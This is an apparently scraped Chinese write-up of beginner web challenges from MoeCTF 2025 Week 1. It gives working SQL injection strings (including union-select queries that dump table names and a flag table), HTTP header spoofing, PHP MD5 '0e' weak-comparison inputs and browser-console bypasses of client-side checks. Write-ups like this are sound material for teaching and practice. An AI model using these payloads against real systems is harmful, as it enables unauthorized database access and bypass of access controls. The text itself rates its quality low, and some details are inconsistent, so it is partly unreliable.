---
title: MoeCTF 2025 Writeup (Web Week 1)
contest: MoeCTF
year: 2025
difficulty: easy
vuln_type: web_unknown
tags: [前端 JS 校验, MD5 弱比较, 字典序 SQL 注入, base64, multi-step path]
attack_chain: |
  1. Web1: 事件绑定 passwordInput 禁止粘贴, JS 字符串相等校验
     - document.querySelector('#passwordInput').value = CORRECT_PASSWORD; validatePassword();
     - document.getElementById('passwordInput').removeEventListener('paste', handlePaste);
  2. Web2: 找了半天 (没详细解法)
  3. Web3: POST /test_talent?level=S + JSON {manifestation: '流云状青芒'} → 触发 alert 显示 flag
  4. Web4 7 步闯关 (修真/玄幻主题):
     - 第一关: /stone_golem?key=xdsec
     - 第二关: /cloud_weaver POST declaration=织云阁=第一
     - 第三关: /shadow_stalker X-Forwarded-For: 127.0.0.1
     - 第四关: /soul_discerner User-Agent: moe browser
     - 第五关: /heart_seal Cookie: user=xt
     - 第六关: /pathfinder Referer: http://panshi/entry
     - 第七关: PUT /void_rebirth
     - flag: bW9lY3Rme0MwbjZyNDd1MTQ3MTBuNV95MHVyX2g3N1BfbDN2M2xfMTVfcjM0bGx5X2gxOWghfQ==
     - moectf{C0n6r47u14710n5_y0ur_h77P_l3v3l_15_r34lly_h19h!}
  5. Web5: SQL 注入 'or'1'='1
  6. Web6: (没详细)
  7. Web7: MD5 弱比较 + 两个不同输入
     - /flag.php?a=QNKCDZO&b=240610708 (QNKCDZO + 240610708 是 0e 开头)
  8. Web8: SQL 注入 order by 2/3 + union select
     - 1' or (true) order by 2#
     - 1' union select (select group_concat(value) from user.flag),2#
key_payload: |
  # Web1: 浏览器控制台直接绕过:
  document.querySelector('#passwordInput').value = CORRECT_PASSWORD;
  validatePassword();
  // 或
  document.getElementById('passwordInput').removeEventListener('paste', handlePaste);
  
  # Web3: POST JSON
  POST /test_talent?level=S
  Content-Type: application/json
  {"manifestation":"流云状青芒"}
  
  # Web4 7 步:
  GET /stone_golem?key=xdsec
  POST /cloud_weaver  declaration=织云阁=第一
  GET /shadow_stalker  X-Forwarded-For: 127.0.0.1
  GET /soul_discerner  User-Agent: moe browser
  GET /heart_seal  Cookie: user=xt
  GET /pathfinder  Referer: http://panshi/entry
  PUT /void_rebirth
  
  # Web5: SQL 注入
  'or'1'='1
  
  # Web7: MD5 弱比较 (0e 开头)
  /flag.php?a=QNKCDZO&b=240610708
  
  # Web8: order by + union
  1' or (true) order by 2#
  1' union select (select group_concat(table_name) from information_schema.tables where table_name=database()),2#
  1' union select (select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name='flag'),2#
  1' union select (select group_concat(value) from user.flag),2#
one_liner: MoeCTF 2025 Week 1 9 道 Web 速查 (前端 JS / MD5 弱比较 / 多步 HTTP 头注入 / SQL 注入)。
lesson: |
  - 前端 JS 校验可直接在控制台绕过 (赋值 + 调函数)
  - 禁止粘贴用 removeEventListener 移除
  - MD5 弱比较: 0e 开头字符串在 PHP == 比较时被当作 0
  - 多步 HTTP 头注入 (X-Forwarded-For / User-Agent / Cookie / Referer / PUT)
  - order by 2/3 + union select 是经典 SQL 注入模板
  - flag base64 解码后才能看
quality: low
---

# MoeCTF 2025 Writeup (Week 1)

> 来源: ctfiot.com 307345

## Web1: 事件绑定 passwordInput (禁止粘贴)

```javascript
document.querySelector('#passwordInput').value = CORRECT_PASSWORD;
validatePassword();
```

或移除 paste 限制：

```javascript
document.getElementById('passwordInput').removeEventListener('paste', handlePaste);
```

## Web3: POST 流云状青芒

```http
POST /test_talent?level=S
Content-Type: application/json
{"manifestation":"流云状青芒"}
```

## Web4 7 步闯关

| 步 | 路径 | 关键参数 |
|----|------|----------|
| 1 | `/stone_golem?key=xdsec` | query string |
| 2 | `/cloud_weaver` POST `declaration=织云阁=第一` | body |
| 3 | `/shadow_stalker` `X-Forwarded-For: 127.0.0.1` | header |
| 4 | `/soul_discerner` `User-Agent: moe browser` | header |
| 5 | `/heart_seal` `Cookie: user=xt` | header |
| 6 | `/pathfinder` `Referer: http://panshi/entry` | header |
| 7 | `PUT /void_rebirth` | method |

flag base64: `bW9lY3Rme0MwbjZyNDd1MTQ3MTBuNV95MHVyX2g3N1BfbDN2M2xfMTVfcjM0bGx5X2gxOWghfQ==`
→ `moectf{C0n6r47u14710n5_y0ur_h77P_l3v3l_15_r34lly_h19h!}`

## Web5: SQL 注入

```sql
' or '1'='1
```

## Web7: MD5 弱比较

```php
$flag = getenv('FLAG');
if ($a == $b) die("error 1");
if (md5($a) != md5($b)) die("error 2");
echo $flag;
```

`/flag.php?a=QNKCDZO&b=240610708` — QNKCDZO 和 240610708 的 md5 都是 0e 开头 + 数字，在 PHP `==` 比较时被当作 0e0 == 0e0 = true。

## Web8: SQL 注入

```sql
1' or (true) order by 2#
1' or (true) order by 3#
1' union select (select group_concat(table_name) from information_schema.tables where table_name=database()),2#
1' union select (select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name='flag'),2#
1' union select (select group_concat(value) from user.flag),2#
```

## 评价

MoeCTF 2025 Week 1 9 道 Web 入门题，亮点是：
- **修真/玄幻主题** (太真实了)
- **MD5 弱比较 0e 字符串** 经典
- **多步 HTTP 头注入** (X-Forwarded-For / Cookie / Referer)
- **PUT 方法** 触发新路由
- **base64 flag** 编码

整体偏入门，适合作为"Web 工具熟悉度"考试。
